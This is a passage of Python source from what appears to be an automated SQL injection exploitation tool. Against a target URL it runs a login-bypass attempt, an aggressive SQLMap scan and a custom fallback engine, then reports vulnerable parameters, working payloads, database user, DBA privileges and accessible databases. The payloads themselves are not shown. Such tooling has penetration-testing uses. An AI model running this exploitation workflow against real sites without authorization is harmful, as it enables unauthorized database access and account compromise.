                    cve_id=cve_id
                )
                
                # Execute the exploit on this parameter
                result = self.execute(vuln)
                
                if result['success']:
                    exploited_params.append({
                        'url': url,
                        'parameter': parameter,
                        'payloads': payloads,
                        'result': result
                    })
            except Exception:
                pass
        
        return {
            'success': len(exploited_params) > 0,
            'cve_id': cve_id,
            'exploited_parameters': exploited_params,
            'data': exploited_params,
            'evidence': f"Exploited {len(exploited_params)} parameter(s) for {cve_id}"
        }

    def execute(self, vulnerability: Vulnerability) -> Dict[str, Any]:
        result = {
            'success': False,
            'data': {},
            'evidence': '',
            'layers_used': [],
            'time_elapsed': 0,
            'step_times': {}
        }

        url = vulnerability.url
        start_time = time.time()

        print(f"\n{'='*70}")
        print(f"[*] üöÄ 3-LAYER SQLi Exploitation Engine (OPTIMIZED)")
        print(f"[*] Target: {url}")
        print(f"{'='*70}\n")

        # STEP 1: Analysis
        print(f"[STEP 1/3] üîç Comprehensive Target Analysis...")
        step1_start = time.time()

        analysis = self.analyzer.analyze(url)

        layer3_config = {
            'max_threads': self.config.get('max_threads', 10),
            'timeout': self.config.get('layer2_timeout', 30),
            'priority_params': self._calculate_priority(analysis)
        }

        # early login-bypass
        try:
            login_result = self.custom.test_login_bypass(url, analysis.get('forms', []), timeout=layer3_config.get('timeout', 30))
            if login_result.get('success'):
                result['success'] = True
                result['layers_used'].append('login_bypass')
                result['data']['login_bypass'] = login_result
                result['evidence'] = self._format_evidence_custom({'vulnerable_params': [], 'working_payloads': [{'param': 'login', 'payload': login_result.get('details')}]}, 0)
                result['time_elapsed'] = time.time() - start_time
                print("[‚úì‚úì‚úì] SUCCESS - Login bypass detected (early)!\n")
                print(f"[COMPLETE] Total Time: {result['time_elapsed']:.1f}s")
                print(f"{'='*70}\n")
                return result
        except Exception as e:
            print(f"[!] Login-bypass check error (continuing): {e}")

        # print analysis summary
        print(f"[+] Discovered:")
        print(f"    ‚îú‚îÄ GET Parameters: {len(analysis.get('get_params', []))}")
        if analysis.get('get_params'):
            print(f"    ‚îÇ  ‚îî‚îÄ {', '.join(analysis.get('get_params'))}")
        print(f"    ‚îú‚îÄ POST Parameters: {len(analysis.get('post_params', []))}")
        if analysis.get('post_params'):
            print(f"    ‚îÇ  ‚îî‚îÄ {', '.join(analysis.get('post_params')[:8])}")
        print(f"    ‚îú‚îÄ Cookies: {len(analysis.get('cookies', {}))}")
        if analysis.get('cookies'):
            print(f"    ‚îÇ  ‚îî‚îÄ {', '.join(analysis.get('cookies').keys())}")
        print(f"    ‚îî‚îÄ Forms: {len(analysis.get('forms', []))}")

        priority_params = self._calculate_priority(analysis)
        print(f"\n[+] Priority Parameters: {len(priority_params)}")
        for param, score in priority_params[:5]:
            print(f"    ‚Ä¢ {param} (score: {score})")

        step1_time = time.time() - step1_start
        result['step_times']['step1_analysis'] = step1_time
        result['data']['analysis'] = analysis

        # STEP 2: SQLMap
        print(f"\n[STEP 2/3] ‚öîÔ∏è  SQLMap Aggressive Scan (Full Power)...")
        step2_start = time.time()

        sqlmap_result = self.sqlmap.run_full_scan(url, analysis)
        step2_time = time.time() - step2_start
        result['step_times']['step2_sqlmap'] = step2_time

        print(f"[STEP 2/3] Completed in {step2_time:.1f}s")

        if sqlmap_result.get('skipped'):
            print(f"[!] SQLMap: Skipped (Not installed)")
        elif sqlmap_result.get('success'):
            print(f"[‚úì‚úì‚úì] SUCCESS - SQLMap found SQLi!\n")
            result['success'] = True
            result['layers_used'].append('sqlmap')
            result['data']['sqlmap'] = sqlmap_result
            result['evidence'] = self._format_evidence_sqlmap(sqlmap_result, step2_time)
            result['time_elapsed'] = time.time() - start_time
            print(f"[COMPLETE] Total Time: {result['time_elapsed']:.1f}s")
            print(f"{'='*70}\n")
            return result
        else:
            print(f"[!] SQLMap: No vulnerability found")

        # STEP 3: Custom engine
        print(f"\n[STEP 3/3] üéØ Custom Exploitation Engine (Fallback)...")
        step3_start = time.time()

        layer3_config['priority_params'] = priority_params
        custom_result = self.custom.exploit(url, analysis, layer3_config)
        step3_time = time.time() - step3_start
        result['step_times']['step3_custom'] = step3_time

        print(f"[STEP 3/3] Completed in {step3_time:.1f}s")

        if custom_result.get('success'):
            print(f"[‚úì‚úì‚úì] SUCCESS - Custom Exploitation worked!\n")
            result['success'] = True
            result['layers_used'].append('custom')
            result['data']['custom'] = custom_result
            result['evidence'] = self._format_evidence_custom(custom_result, step3_time)
            result['time_elapsed'] = time.time() - start_time
            print(f"[COMPLETE] Total Time: {result['time_elapsed']:.1f}s")
            print(f"{'='*70}\n")
            return result

        print(f"[‚úó] No SQLi found\n")
        result['evidence'] = self._format_evidence_failed(sqlmap_result, custom_result, result['step_times'])
        result['time_elapsed'] = time.time() - start_time
        print(f"[COMPLETE] Total Time: {result['time_elapsed']:.1f}s")
        print(f"{'='*70}\n")
        return result

    def _calculate_priority(self, analysis: Dict[str, Any]) -> List[Tuple[str, float]]:
        priority_keywords = ['id', 'product', 'user', 'search', 'query', 'page', 'category', 'filter']
        priority_scores = {}

        get_params = analysis.get('get_params', []) or []
        post_params = analysis.get('post_params', []) or []

        for param in get_params:
            score = 0.0
            pl = param.lower()
            for keyword in priority_keywords:
                if keyword in pl:
                    score += 2.0
            score += 1.0
            priority_scores[param] = score

        for param in post_params:
            score = 0.0
            pl = param.lower()
            for keyword in priority_keywords:
                if keyword in pl:
                    score += 2.5
            score += 2.0
            priority_scores[param] = max(priority_scores.get(param, 0.0), score)

        return sorted(priority_scores.items(), key=lambda x: x[1], reverse=True)

    def _format_evidence_sqlmap(self, sqlmap_result: Dict[str, Any], elapsed: float) -> str:
        evidence = f"=== SQLMap Detection ===\n"
        evidence += f"‚è±Ô∏è  Time: {elapsed:.1f}s\n\n"
        if sqlmap_result.get('injection_points'):
            evidence += f"üéØ Vulnerable Parameters:\n"
            for param in sqlmap_result['injection_points']:
                evidence += f"  ‚úì {param}\n"
        if sqlmap_result.get('injection_types'):
            evidence += f"\nüìå Injection Types:\n"
            for itype in sqlmap_result['injection_types']:
                evidence += f"  ‚Ä¢ {itype}\n"
        if sqlmap_result.get('dbms'):
            evidence += f"\nüîß Database: {sqlmap_result['dbms']}\n"
        if sqlmap_result.get('payloads'):
            evidence += f"\nüíâ Working Payloads:\n"
            for payload in sqlmap_result['payloads'][:3]:
                evidence += f"  ‚Üí {payload}\n"
        if sqlmap_result.get('current_user'):
            evidence += f"\nüë§ User: {sqlmap_result['current_user']}\n"
        if sqlmap_result.get('current_db'):
            evidence += f"üì¶ Database: {sqlmap_result['current_db']}\n"
        if sqlmap_result.get('is_dba'):
            evidence += f"‚ö†Ô∏è  DBA Privileges: YES\n"
        if sqlmap_result.get('databases'):
            evidence += f"\nüóÑÔ∏è  Accessible Databases ({len(sqlmap_result['databases'])}):\n"
            for db in sqlmap_result['databases'][:10]:
                evidence += f"  ‚Ä¢ {db}\n"
        return evidence

    def _format_evidence_custom(self, custom_result: Dict[str, Any], elapsed: float) -> str:
        evidence = f"=== Custom Exploitation ===\n"
        evidence += f"‚è±Ô∏è  Time: {elapsed:.1f}s\n"
        evidence += f"üìä Tested Parameters: {custom_result.get('tested_params', 0)}\n\n"
        if custom_result.get('vulnerable_params'):
            evidence += f"üéØ Vulnerable Parameters:\n"
            for param in set(custom_result['vulnerable_params']):
                evidence += f"  ‚úì {param}\n"
        if custom_result.get('working_payloads'):
            evidence += f"\nüíâ Working Payloads:\n"
            for item in custom_result['working_payloads'][:5]:
                reason = item.get('reason', 'detected change')
                strategy = item.get('strategy', 'unknown')
                evidence += f"  ‚Ä¢ [{strategy}] {item.get('param')}: {item.get('payload')}\n"
                evidence += f"      ‚îî‚îÄ Reason: {reason}\n"
        return evidence

    def _format_evidence_failed(self, sqlmap_result: Dict[str, Any], custom_result: Dict[str, Any], step_times: Dict[str, float]) -> str:
        evidence = f"=== Exploitation Failed ===\n"
        evidence += f"‚è±Ô∏è  Total Time: {sum(step_times.values()):.1f}s\n\n"
        evidence += f"üìä Timeline:\n"
        for step, elapsed in step_times.items():
            evidence += f"  ‚Ä¢ {step}: {elapsed:.1f}s\n"
        evidence += f"\n‚ùå SQLMap Result:\n"
        evidence += f"  {sqlmap_result.get('error', 'No vulnerability detected')}\n"
        evidence += f"\n‚ùå Custom Exploitation:\n"
        evidence += f"  Tested {custom_result.get('tested_params', 0)} parameters\n"
        evidence += f"  No injection patterns detected\n"
        return evidence
